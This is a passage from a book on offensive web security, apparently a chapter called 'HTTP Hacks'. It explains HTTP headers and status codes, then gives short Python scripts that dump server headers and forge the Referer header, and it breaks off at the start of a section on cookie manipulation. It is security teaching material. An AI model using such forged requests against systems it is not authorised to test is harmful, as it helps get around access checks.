+request options are Referer , that includes the URL that generated this request,
+
+7.1 Protocol Overview 87
+Fig. 7.2 HTTP-response-header
+Authorization , which is used by HTTP-Auth to implement login functionality and
+Cookie , that includes all cookies.
+Cookies are name/value pairs, that the server asks the client to save and resend
+with every request. You can read more about cookies in Sect. 7.6about cookie
+manipulation.
+Basic Mode HTTP auth just uses Base64 to encode but not encrypt the
+username/password combination. For r eal security one should use Digest Access
+Authentication! Otherwise an attacker could just grab them like demonstrated in
+Sect. 7.7.
+Figure 7.2shows a typical HTTP response. The only ﬁxed portion beside the
+HTTP version is the status code as well as the status message.
+HTTP status codes can be classiﬁed into ﬁve different groups. If it begins with
+a 1 the server asks for the next request being different (e.g. with a newer HTTP
+version). If it starts with a 2 the request was successful and free of any errors.
+A 3 indicates a successful but redirected request. A 4 signals a failure. The most
+commonly known is 404 which means that the requested resource could not be
+found and 403 that says that the access attempt is not authorized. If you get a 5 at the
+beginning, your request produced a serious failure such as the 500 Internal Server
+Error message. A list of the most important status codes and their description can
+be found in Table 7.2.
+Another important HTTP response headers beside content-length, content-type
+and content-encoding are Location , that includes the requested URL and Set-
+Cookie to set a cookie on the client.
+
+88 7 HTTP Hacks
+Table 7.2 Most important HTTP status codes
+Code Description
+200 Successful request
+201 Resource was newly created
+301 Resource moved permanently
+307 Resource moved temporarily
+400 Invalid request
+401 Authorization required
+403 Access denied
+404 Resource could not be found
+405 Method not allowed
+500 Internal server error
+A description of the complete HTTP protocol including all status codes can be
+found in the RFC 2616 under www.w3.org/Protocols/rfc2616/rfc2616.html .
+7.2 Web Services
+For some years now, web services have become a big trend. A web service is a
+service that allows machine-to-machine communication. A few new standards andprotocols were developed for this purpose like REST, that uses the HTTP methodsGET, PUT and DELETE to implement a CRUD (Create, Read, Update, Delete) API,XML-RPC, that allows remote proce dure calls encoded in XML over HTTP and
+SOAP, which makes it possible to transfer whole objects over the network. SOAPdeﬁnes another XML format called WSDL (Webservice Description Language),that describes a web service and how a rem ote computer can automatically generate
+stub code to communicate with it.
+This book cannot go into too much detail about speciﬁc web service protocols,
+because this chapter should merely cover HTTP -based attacks, but interested readers
+can adopt the described methods to attack web services. Often it is not necessary toattack web services at all, because their s ervices are completel y unprotected. If an
+attack is needed, full blown and complex protocols like the so called Simple ObjectAccess Protocol SOAP shoul d revel enough possibilities.
+7.3 Required Modules
+Most examples in this chapter don’t use th e urllib2 module, which is integrated into
+the Python distribution, but the httplib2 m odule, because it provides such additional
+nice features as caching, re direction and compression.
+
+7.5 Referer Spooﬁng 89
+Furthermore we will apply BeautifulSoup to parse HTML code as well as
+mitmproxy for implementing HTTP man in the middle attacks.
+All modules are quickly installed by executing
+pip install httplib2
+pip install BeautifulSoup
+pip install mitmproxy
+And now let’s hack some source code!
+7.4 HTTP Header Dumper
+Let us start with a simple warm-up and jus t dump all HTTP header options received
+by a web server onto the screen.
+1#!/usr/bin/python
+2
+3import sys
+4import httplib2
+5
+6if len(sys.argv) < 2:
+7print sys.argv[0] + ": <url>"
+8sys.exit(1)
+9
+10webclient = httplib2.Http()
+11header, content = webclient.request(sys.argv[1], "GET")
+12
+13for field, value in header.items():
+14 print field + " : " + value
+You can optionally submit a directory to the constructor Http() in order
+to activate caching to it. The real work is done by the function request() ,
+which takes the HTTP method beside the URL parameter. It returns two values:a dictionary containing the header data, that we will output later, and the contentsuch as the HTML page of the URL, which we will ignore in this ﬁrst example.
+7.5 Referer Spooﬁng
+An interesting header of HTTP that a browser sends with every request is the referer.
+It contains the URL this request is originating from. Some web applications use itas a security feature to ﬁgure out if the request comes from an internal network andconcludes that the user must therefore be logged in.
+
+90 7 HTTP Hacks
+That’s a really bad idea as the referer h eader can freely be manipulated as the
+next examples shows.
+1#!/usr/bin/python
+23import sys
+4import httplib2
+56if len(sys.argv) < 2:
+7print sys.argv[0] + ": <url>"
+8sys.exit(1)
+9
+10headers = {’Referer’: ’http://www.peter-lustig.com’}
+11webclient = httplib2.Http()
+12response, content = webclient.request(sys.argv[1],
+13 ’GET’,
+14 headers=headers)
+15print content
+We write the header data we are going to send into a dictionary, which the
+request method takes as an argument. Therefore it is not important if the keys ofthe dictionary are valid HTTP header or total crap.
+7.6 The Manipulation of Cookies
+HTTP is a stateless protocol. As mentioned before, every request sent by a client iscompletely independent from other request s. They don’t knows anything about other
+requests. By using several tricks web devel opers are able to circumvent the stateless
+property of HTTP by pinning hopefully indi vidual and hard-to-guess numbers to
+their visitors, the so called session Id. This is sent with every request to identifya client and as the name implies should be valid for one session and deleted aftera logout process. There are several known cases where such a number gets savedinto a cookie. The complete cookie data gets sent with every request belonging tothe domain or host the cookie was generated from. Sometimes, and nowadays moreoften, cookies are used to track a user by implementing them in advertisements thatare displayed on various sites, such as Google Ads, to analyze the users consumerbehavior. That’s why cookies don’t have a good reputation, but they can be andget used in many other ways. For example in frameworks to handle authenticationby including the session Id, a logged in ﬂag or even a username and password incleartext.
+Whatever is saved in your cookies and how good a web developer tries to protect
+its application against keen attacks, like SQL or even command injection (moreabout this later), cookies often get overlooked. This is because they seem to actinvisibly in the background. One does not expect them to get manipulated like
+
+
+[Note: PDF has 187 pages, only first 100 pages extracted]
